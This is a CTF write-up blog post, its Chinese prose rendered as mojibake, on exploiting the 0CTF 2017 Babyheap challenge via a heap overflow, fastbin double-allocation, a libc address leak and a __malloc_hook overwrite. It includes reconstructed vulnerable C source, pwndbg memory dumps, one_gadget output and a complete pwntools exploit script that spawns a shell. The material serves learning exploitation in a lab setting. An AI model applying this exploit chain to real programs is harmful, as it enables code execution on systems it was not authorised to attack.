---
title: å †æº¢å‡ºå­¦ä¹ ä¹‹0CTF 2017 Babyheap
date: 2017-08-01 22:12:10
tags: bin
---

æœ€è¿‘åœ¨å­¦ä¹ å †, çœ‹äº†[how2heap](https://github.com/shellphish/how2heap)ä¸Šçš„`fastbin_dup`ï¼Œä¾‹å­éƒ½è¿˜æŒºç®€å•çš„ï¼Œç„¶åå­¦åšäº†ä¸‹0CTF 2017çš„Babyheapï¼Œç„¶åå¼€å¯äº†æ–°å¤§é™†ï¼Œå‘ç°æˆ‘ä»¥å‰æ ¹æœ¬å°±ä¸ä¼šPwn......

<!--more-->

# fastbin_dup

å…ˆè¯´ä¸‹how2heapä¸Šçš„ä¾‹å­ï¼Œä¸€ä¸ªæ˜¯[fastbin_dup.c](https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c)è¿˜æœ‰ä¸€ä¸ªæ˜¯[fastbin_dup_into_stack](https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c)

å…¶å®è¿™ä¸¤ä¸ªä¾‹å­æŒºç®€å•çš„ï¼Œçœ‹æ‡‚æˆ‘ä¸Šä¸€ç¯‡è®²fastbinçš„blogï¼Œå¯¹ç€ä»£ç çœ‹çœ‹åº”è¯¥å¾ˆå®¹æ˜“ç†è§£ï¼Œç¬¬ä¸€ä¸ªå…¶å®å°±æ˜¯æ¼”ç¤ºä¸‹fastbinçš„2freeï¼Œç¬¬äºŒä¸ªæ˜¯æ¼”ç¤ºåˆ©ç”¨fastbinçš„2freeï¼Œmallocå‡ºä¸€ä¸ªç‰¹å®šçš„åœ°å€ï¼Œå¾ˆç®€å•çš„ï¼Œå…¶å®å°±æ˜¯é€šè¿‡ä¿®æ”¹fastbinçš„fdï¼Œå¤ªç®€å•äº†å°±ä¸å¤šè®²äº†...

# Babyheap

é¢˜ç›®æˆ‘githubä¸Šæœ‰: <https://github.com/Hcamael/CTF_repo/tree/master/0CTF%202017/Pwn10(Baby%20Heap%202017)>

è¿™é¢˜æ˜¯æœ‰ä¸ªlibcåº“çš„ï¼Œè¿™é¢˜çš„éš¾ç‚¹åœ¨å“ªï¼Ÿæˆ‘è§‰å¾—å°±æ˜¯å¼€äº†PIEä¿æŠ¤ï¼Œåœ°å€éšæœºåŒ–ï¼Œä¹‹å‰æˆ‘blogä¸­åšçš„é‚£äº›é¢˜æˆ‘ä»¬æ˜¯å¯ä»¥çŸ¥é“binä¸­çš„åœ°å€çš„ï¼Œæ¯”å¦‚`got`è¡¨ï¼Œ`plt`è¡¨å•Šï¼Œ`.bss`æˆ–è€…`.data`é‡Œå•¥å˜é‡çš„åœ°å€å•Šï¼Œé‚£éƒ½æ˜¯åœ¨æ²¡å¼€PIEçš„æƒ…å†µï¼Œå½“å¼€äº†PIEï¼Œä»»ä½•åœ°å€æˆ‘ä»¬éƒ½æ˜¯æœªçŸ¥çš„ã€‚

è¿˜æœ‰ä¸€ä¸ªéš¾ç‚¹å°±æ˜¯è°ƒè¯•ä¸å¥½è°ƒè¯•(æˆ‘æœ€è¿‘ä»pedaæ¢æˆäº†pwndbg)ï¼Œæœ‰ä¸¤ä¸ªéš¾ç‚¹ï¼Œé¦–å…ˆæ˜¯æœ‰ä¸ªalarmï¼Œæ¯æ¬¡è°ƒè¯•çš„æ—¶å€™éƒ½è¦è·³è¿‡æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œè¦ä¸ç„¶å°±åœ¨binä¸­patchæ‰è¿™ä¸ªå‡½æ•°ï¼Œè¿˜æœ‰ä¸ªåº”è¯¥æ˜¯å› ä¸ºPIEçš„åŸå› ï¼Œè°ƒç”¨ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™pwndbgæ²¡åŠæ³•å¸®æˆ‘æ˜¾ç¤ºå‡½æ•°å‘½äº†ï¼Œå®³æˆ‘è¿˜è¦å»æŸ¥è¿™ä¸ªå‡½æ•°æ˜¯mallocè¿˜æ˜¯freeã€‚è¿™ä¸¤ä¸ªå¤ªå½±å“æˆ‘è°ƒè¯•çš„è¿›åº¦äº†ï¼Œæ‰€ä»¥æˆ‘æ ¹æ®binå¤ç°äº†ä¸€ä¸ªé€»è¾‘ç›¸åŒçš„æºç ï¼š

```c
#include <stdlib.h>
#include <stdio.h>

long int list[16*3];

void menu()
{
    puts("1. Allocate");
    puts("2. Fill");
    puts("3. Free");
    puts("4. Dump");
    puts("5. Exit");
    puts("Command: ");
}

int read_str(char *s, int len)
{
    int tmp, x, r;
    char buf;
    if (len){
        tmp = 0;
        while(len-1 > tmp){
            x = read(0, &buf, 1);
            if (x>0){
                if(buf==10)
                    break;
                *(s+tmp) = buf;
                tmp++;
            }
            else
                break;
        }
        *(s+tmp) = 0;
        r = tmp;
    }
    else
        r = 0;
    return r;
}

long read_int()
{
    char s[8];
    read_str(&s, 8);
    return atol(s);
}

void alloca_chunk()
{
    long int n;
    char *add;
    for(int i=0; i<=15; i++)
    {
        if (!list[i*24]){
            printf("Size: ");
            n = read_int();
            if(n > 0)
            {
                if (n > 4096)
                    n = 4096;
                add = calloc(n, 1);
                if (!add)
                    exit(-1);
                list[24*i] = 1;
                list[24*i + 8] = n;
                list[24*i + 16] = add;
                printf("Allocate Index %d\n", i);
            }
            return;
        }
    } 
}

long fill_data(long index, long len)
{
    long n, m, r;
    if(len){
        n = 0;
        while (n < len){
            m = read(0, list[index*24+16], len-n);
            if (m > 0)
                n += m;
            else
                break;
        }
        r = n;
    }
    else
        r = 0;
    return r;
}

void fill_chunk()
{
    long result, index;
    printf("Index: ");
    result = read_int();
    index = result;
    if ((result & 0x80000000) == 0 && result <= 15)
    {
        result = list[result*24];
        if (result == 1){
            printf("Size: ");
            result = read_int();
            if (result > 0){
                printf("Content: ");
                result = fill_data(index, result);
            }
        }
    }
    return;
}

void free_chunk()
{
    long r, index;
    printf("Index: ");
    r = read_int();
    index = r;
    if (r >= 0 && r <= 15){
        r = list[index*24];
        if (r == 1){
            list[index*24] = 0;
            list[index*24+8] = 0;
            free(list[index*24+16]);
            list[index*24+16] = 0;
        }
    }
    return;
}

long write_data(long addr, long len)
{
    unsigned long n;
    int s;
    n = 0;
    while(n < len)
    {
        s = write(1, addr+n, len-n);
        if (s > 0)
        {
            n += s;
        }
        else
            break;
    }
    return n;
}

void dump_chunk()
{
    long r, index;
    printf("Index: ");
    r = read_int();
    index = r;
    if (r >=0 && r <=15)
    {
        r = list[index*24];
        if (r == 1)
        {
            puts("Content: ");
            write_data(list[index*24+16], list[index*24+8]);
            puts("");
        }
    }
}

int main(void)
{
    unsigned long n;
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    for(;;){
        menu();
        n = read_int();
        switch(n){
            case 1: alloca_chunk(); break;
            case 2: fill_chunk(); break;
            case 3: free_chunk(); break;
            case 4: dump_chunk(); break;
            case 5: return 0;
        }
    }
}
```

æˆ‘è¿˜åŸçš„ä»£ç å’Œbinå·®åˆ«è¿˜æ˜¯æŒºå¤šçš„ï¼Œä½†æ˜¯4ä¸ªå‡½æ•°çš„é€»è¾‘åŸºæœ¬ç›¸åŒï¼Œè¿˜åŸè¿™ä¸ªä»£ç åªæ˜¯ä¸ºäº†æ–¹ä¾¿æˆ‘è°ƒè¯•ï¼Œæ‰€ä»¥å¹¶ä¸å¼€PIEï¼Œç„¶åè°ƒè¯•çš„æ—¶å€™å½“åšæˆ‘å¼€äº†ğŸ˜

æˆ‘æ€»ç»“äº†ä¸‹ï¼Œè¿™é¢˜å·²ç»å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªå§¿åŠ¿

PS: callocå’Œmallocæ˜¯å·®ä¸å¤šçš„ï¼ŒåŒºåˆ«å¾ˆå°ï¼Œå…·ä½“çš„è‡ªè¡Œgoogle

## leak libc address

ç¬¬ä¸€æ­¥åŸºæœ¬éƒ½æ˜¯æƒ³ç€æ³„éœ²åœ°å€ï¼Œè¿™é¢˜åˆ©ç”¨å †æœ‰ä¸€ä¸ªæ³„éœ²libcåœ°å€çš„å§¿åŠ¿

é¦–å…ˆï¼Œå…ˆç®€å•çš„è¯´ï¼Œä¸€ä¸ªsmall binï¼Œå®ƒçš„fdå’Œbkä¼šæŒ‡å‘top chunk(å‰©ä¸‹çš„small bin, large bin, unsortbinè¿˜æœ‰ä¸€ä¸ªremainderæˆ‘ä¹‹ååº”è¯¥ä¹Ÿä¼šå†™blog)ï¼ŒæŒ‡å‘çš„ä¸æ˜¯top chunkçš„åœ°å€ï¼Œè€Œæ˜¯æŒ‡å‘top chunkæŒ‡é’ˆï¼Œå†è¯¦ç»†ç‚¹å°±æ˜¯ï¼Œåœ¨arenaä¸­æœ‰ä¸€ä¸ªåœ°æ–¹å­˜æ”¾çš„æ˜¯top chunkçš„åœ°å€ï¼Œåœ¨fastbinä¹‹åremainderä¹‹å‰(ä¸Šä¸€ç¯‡è®²fastbinçš„åº”è¯¥æœ‰æåŠåˆ°)ï¼Œè€Œfdå’Œbkå°±æ˜¯ä¼šæŒ‡å‘è¿™ä¸ªåœ°å€ï¼Œè€Œarenaæ˜¯ä½äºlibcçš„`.data`åŒºåŸŸï¼Œæ‰€ä»¥arenaçš„åœ°å€ä¹Ÿå°±æ˜¯libcçš„åœ°å€ï¼Œè€Œæˆ‘ä»¬æœ‰äº†libcåº“ï¼Œæ‰€ä»¥ä¹Ÿèƒ½ç®—å‡ºå…¶ä»–åœ°å€ã€‚

åœ¨è¿™ä¹‹å‰ï¼Œè¿˜å¾—è§£å†³ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ€ä¹ˆè¾“å‡ºfdæˆ–è€…æ˜¯bkï¼Œå½“freeäº†ä¹‹åå°±æ²¡æ³•dumpäº†ã€‚æ‰€ä»¥è¿™é‡Œå°±å¾—åˆ©ç”¨åˆ°ä¹‹å‰æåˆ°çš„`fatbin_dup`äº†

ç°åœ¨å°±æ¥è¯¦ç»†çš„è¯´ä¸‹ï¼Œé¦–å…ˆï¼Œmallocå‡ºä¸‹é¢è¿™æ ·çš„å †ç©ºé—´

|    åœ°å€     | 0-8 byte | 9-f byte |
| :-------: | :------: | :------: |
| id:0/0x00 |    0     |   0x21   |
|   0x10    |    0     |    0     |
| id:1/0x20 |    0     |   0x21   |
|   0x30    |    0     |    0     |
| id:2/0x40 |    0     |   0x21   |
|   0x50    |    0     |    0     |
| id:3/0x60 |    0     |   0x91   |
|   0x70    |    0     |    0     |
| id:4/0xf0 |    0     |   0x91   |

é¦–å…ˆæ˜¯mallocå‡º3ä¸ªfast chunkå’Œä¸¤ä¸ªsmall chuankï¼Œsmall chunkè¿™é‡Œmallocå‡ºä¸¤ä¸ªæ˜¯å› ä¸ºå¦‚æœfreeçš„small chunkä¸‹é¢æ˜¯top chunkï¼Œåˆ™è§¦å‘unlinkåˆå¹¶æœºåˆ¶ï¼Œä¹Ÿå°±æ²¡æœ‰å•¥fdå’Œbkäº†ï¼Œæ‰€ä»¥mallocå‡ºä¸¤ä¸ªï¼Œç„¶åfreeç¬¬ä¸€ä¸ª

è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œä¸Šé¢è¡¨ä¸­çš„åœ°å€æˆ‘å¯ä¸æ˜¯ä¹±å†™çš„ï¼Œå› ä¸ºè¦é¡µå¯¹é½çš„åŸå› ï¼Œæˆ‘ä»¬è™½ç„¶ä¸çŸ¥é“mallocçš„å…·ä½“åœ°å€ç©ºé—´ï¼Œä½†æ˜¯æˆ‘ä»¬å´èƒ½çŸ¥é“æœ€åä¸€ä¸ªbyteçš„å€¼å°±æ˜¯æˆ‘ä¸Šé¢æ ‡çš„è¿™æ ·çš„

ç¬¬ä¸€æ­¥æˆ‘ä»¬å…ˆfree(2)ï¼Œç„¶åæˆ‘ä»¬å†free(1)ï¼Œè¿™ä¸ªæ—¶å€™çš„å †æ˜¯è¿™æ ·çš„ï¼š

|    åœ°å€     | 0-8 byte | 9-f byte |
| :-------: | :------: | :------: |
| id:0/0x00 |    0     |   0x21   |
|   0x10    |    0     |    0     |
|   0x20    |    0     |   0x21   |
|   0x30    |   0x40   |    0     |
|   0x40    |    0     |   0x21   |
|   0x50    |    0     |    0     |

ç„¶ååœ¨binä¸­æœ‰ä¸€å¤„å¾ˆæ˜æ˜¾çš„æ¼æ´ï¼Œfillå‡½æ•°ä¸­è¾“å…¥çš„æ•°æ®é•¿åº¦æ˜¯åœ¨fillå‡½æ•°ä¸­ç”±ä½ è¾“å…¥çš„ï¼Œè€Œä¸æ˜¯ä½ mallocçš„é•¿åº¦ï¼Œæ‰€ä»¥è¿™é‡Œå°±å­˜åœ¨å †æº¢å‡ºï¼Œæ¯”å¦‚æˆ‘malloc(0x10)ï¼Œä½†æ˜¯æˆ‘fillå´å¯ä»¥è¾“å…¥0x30çš„æ•°æ®ã€‚

åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡fill(0)ï¼Œä»è€Œä¿®æ”¹0x30åœ°å€çš„ç¬¬ä¸€ä¸ªbyteï¼Œä¿®æ”¹æˆ0x60ï¼Œpayload:

```python
payload = p64(0)*3
payload += p64(0x21)
payload += p8(0x60)
```

è¿™æ ·æˆ‘ä»¬å†malloc(0x10)ï¼Œè·å–åˆ°äº†0x20ï¼Œå†æ¬¡malloc(0x10)ï¼Œå¹¶ä¸èƒ½è·å¾—åˆ°0x60ï¼Œè®²fastbinçš„æ—¶å€™è®²è¿‡ï¼Œmallocæœ‰checkæœºåˆ¶ï¼Œä¼šchecké•¿åº¦ï¼Œå› ä¸º0x60çš„é•¿åº¦æ˜¯0x90ï¼Œæ‰€ä»¥ä¼šå¤±è´¥ã€‚

è§£å†³æ–¹æ¡ˆä¹Ÿå¾ˆç®€å•ï¼Œåœ¨free(2)ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆfill(2)ï¼Œä¿®æ”¹æˆ0x21ï¼Œpayload:

```python
payload = p64(0)*3
payload += p64(0x21)
```

è¿™ä¸ªæ—¶å€™çš„å †æ˜¯è¿™æ ·çš„ï¼š

|       åœ°å€       | 0-8 byte | 9-f byte |
| :------------: | :------: | :------: |
|   id:0/0x00    |    0     |   0x21   |
|      0x10      |    0     |    0     |
|   id:1/0x20    |    0     |   0x21   |
|      0x30      |    0     |    0     |
|      0x40      |    0     |   0x21   |
|      0x50      |    0     |    0     |
| id:3/id:2/0x60 |    0     |   0x21   |

ç„¶åfill(1)ï¼Œpayload:

```python
payload = p64(0)*3
payload += p64(0x21)
payload += p64(0)*3
payload += p64(0x91)
```

æ¥ä¿®å¤small chunkçš„size

è¿™æ—¶å€™å°±èƒ½æˆåŠŸçš„free(3)

è¿™ä¸ªæ—¶å€™çš„å †ï¼š

|    åœ°å€     |    0-8 byte    |    9-f byte    |
| :-------: | :------------: | :------------: |
| id:0/0x00 |       0        |      0x21      |
|   0x10    |       0        |       0        |
| id:1/0x20 |       0        |      0x21      |
|   0x30    |       0        |       0        |
|   0x40    |       0        |      0x21      |
|   0x50    |       0        |       0        |
| id:2/0x60 |       0        |      0x91      |
|   0x70    | fd(*top_chunk) | bk(*top_chunk) |

ç„¶åæˆ‘ä»¬å†dump(2)ï¼Œå°±èƒ½è·å–åˆ°libcçš„åœ°å€äº†

## malloc hook

è¿™å¯¹æˆ‘æ¥è¯´ä¹Ÿæ˜¯ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹

```masm
pwndbg> x/36gx 0x7ffff7dd1b20-0x40
0x7ffff7dd1ae0 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1af0 <_IO_wide_data_0+304>:	0x00007ffff7dd0260	0x0000000000000000
0x7ffff7dd1b00 <__memalign_hook>:	0x00007ffff7a92e20	0x00007ffff7a92a00
0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
```

åœ¨arenaçš„ä¸Šé¢ï¼Œæœ‰ä¸ªmalloc_hookï¼Œå½“è¿™ä¸ªåœ°å€çš„å€¼ä¸ä¸º0æ—¶ï¼Œæˆ‘ä»¬æ‰§è¡Œmallocå°†ä¼šå…ˆè·³åˆ°malloc_hookçš„åœ°å€ä¸Šæ‰§è¡ŒæŒ‡ä»¤

æ‰€ä»¥è¿™é‡Œå°±æœ‰ä¸€ä¸ªæ€è·¯äº†ï¼Œæˆ‘ä»¬æŠŠmalloc_hookç»™èµ‹å€¼ä¸€ä¸ªæ‰§è¡ŒshellæŒ‡ä»¤çš„åœ°å€ï¼Œè¯¥åœ°å€å‡è®¾ä¸º0x23333

ç„¶åæˆ‘ä»¬æ‰§è¡Œmallocå‡½æ•°ï¼Œä¸å°±å¯ä»¥æ‹¿åˆ°shelläº†ä¹ˆ

è¦†ç›–malloc_hookå€’æŒºç®€å•çš„ï¼Œå°±æ˜¯é€šè¿‡ä¸Šé¢çš„fastbin_dupæ–¹æ³•ï¼Œmallocå‡ºæœ€å¤§æ˜¯malloc_hook-0x16çš„åœ°å€ï¼Œç„¶åé€šè¿‡fillæ¥è¦†ç›–malloc_hook

è¿™é‡Œçš„å”¯ä¸€é—®é¢˜å°±æ˜¯mallocçš„é•¿åº¦æ£€æŸ¥ï¼Œç„¶åfastbinçš„sizeèŒƒå›´æ˜¯0x20-0x80

è¿™ä¸ªé—®é¢˜ä¹Ÿå¥½è§£å†³ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹ä¸Šé¢çš„æ•°æ®ï¼Œå‚¨å­˜äº†ä¸€äº›åœ°å€ï¼Œè€Œè¿™äº›åœ°å€çš„é«˜ä½éƒ½æ˜¯0x7fï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹åç§»ï¼Œè¿™æ ·:

```asm
pwndbg> x/10gx 0x7ffff7dd1b20-0x33
0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
0x7ffff7dd1afd:	                        0xfff7a92e20000000	0xfff7a92a0000007f
0x7ffff7dd1b0d <__realloc_hook+5>:	    0x000000000000007f	0x0000000000000000
0x7ffff7dd1b1d:	                        0x0100000000000000	0x0000000000000000
0x7ffff7dd1b2d <main_arena+13>:	        0x0000000000000000	0x0000000000000000
```

è¿™æ ·ï¼Œå°±æˆåŠŸæ„é€ äº†ä¸€ä¸ªæœ‰æ•ˆsize

ç„¶åæˆ‘ä»¬åˆ©ç”¨fastbin_dupï¼Œè¾¾åˆ°malloc(0x60)è¿”å›æ”¹åœ°å€çš„ç›®çš„ï¼Œç„¶åæŠŠmalloc_hookçš„åœ°å€è¦†ç›–æˆ0x23333å°±å¥½äº†

ä¸Šé¢çš„åˆ©ç”¨è¿‡ç¨‹æˆ‘ä»¬ä¸éœ€è¦çŸ¥é“å…·ä½“çš„åœ°å€ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“è¿™ä¸ªåœ°å€å’Œæˆ‘ä»¬ä¹‹å‰æ³„éœ²å‡ºæ¥çš„åœ°å€ä¹‹å‰çš„å·®å€¼å°±èƒ½è®¡ç®—å‡ºæ¥è¯¥åœ°å€äº†

## å¯»æ‰¾getshellæŒ‡ä»¤

æˆ‘çœ‹äº†åˆ«äººçš„wpï¼Œå‘ç°ä½¿ç”¨ä¸€ä¸ª[one_gadget](https://github.com/david942j/one_gadget)å·¥å…·

```shell
$ one_gadget libc.so.6 
0x41374	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xbac7d	execve("/bin/sh", rsi, r12)
constraints:
  [rsi] == NULL || rsi == NULL
  [r12] == NULL || r12 == NULL

0xbaccc	execve("/bin/sh", [rbp-0x48], r12)
constraints:
  [[rbp-0x48]] == NULL || [rbp-0x48] == NULL
  [r12] == NULL || r12 == NULL

0xd6e77	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0xdaa50	execve("/bin/sh", r9, rdx)
constraints:
  [r9] == NULL || r9 == NULL
  [rdx] == NULL || rdx == NULL
```

å¯ä»¥æ‰¾åˆ°å¥½å‡ ä¸ªèƒ½getshellçš„æŒ‡ä»¤

Tï¼šé‚£ä¹ˆä»¥å‰åšæ ˆæº¢å‡ºçš„æ—¶å€™æ˜¯ä¸æ˜¯æ³„éœ²å‡ºlibcåœ°å€åå¯ä»¥ç›´æ¥è·³åˆ°è¿™ä¸ªåœ°å€äº†ï¼Œå°±ä¸ç”¨å†è‡ªå·±æ„é€ system('/bin/sh')äº†ï¼Ÿä¸‹æ¬¡å»è¯•è¯•

-------

æ„Ÿè§‰è‡ªå·±ä»æ¥å°±ä¸ä¼šPwn......ç»§ç»­åŠªåŠ›å­¦ä¹ æ–°å§¿åŠ¿

æœ€åé™„ä¸ŠPoC:

```python
#!/usr/bin/env python
# -*- coding=utf-8 -*-

from pwn import *

def alloc(size):
    r.sendline('1')
    r.sendlineafter(': ', str(size))
    r.recvuntil(': ', timeout=5)

def fill(idx, data):
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(len(data)))
    r.sendafter(': ', data)
    r.recvuntil(': ')

def free(idx):
    r.sendline('3')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': ')

def dump(idx):
    r.sendline('4')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': \n')
    data = r.recvline()
    r.recvuntil(': ')
    return data

if __name__ == '__main__':
    debug = 1

    if debug:
        context.log_level = "debug"
        r = process("./test")
    else:
        r = remote("127.0.0.1", 10000)
    r.recvuntil(': ')

    alloc(0x10)
    alloc(0x10)
    alloc(0x10)
    alloc(0x80)
    alloc(0x80)

    payload  = p64(0)*3
    payload += p64(0x21)
    fill(2, payload)

    free(2)
    free(1)

    payload  = p64(0)*3
    payload += p64(0x21)
    payload += p8(0x60)
    fill(0, payload)

    alloc(0x10)
    alloc(0x10)

    payload  = p64(0)*7
    payload += p64(0x91)
    fill(1, payload)
    free(3)

    arena_top = u64(dump(2)[:8])
    log.info("arena_top_chunk: " + hex(arena_top))

    alloc(0x60)
    free(3)

    fill(2, p64(arena_top - 139))    # malloc_hookä¸Šé¢çš„åœ°å€
    alloc(0x60)
    alloc(0x60)

    payload  = '\x00'*3
    payload += p64(0)*2
    payload += p64(arena_top - 3556100)  # getshellçš„åœ°å€
    fill(5, payload)

    alloc(233)

    r.interactive()

```

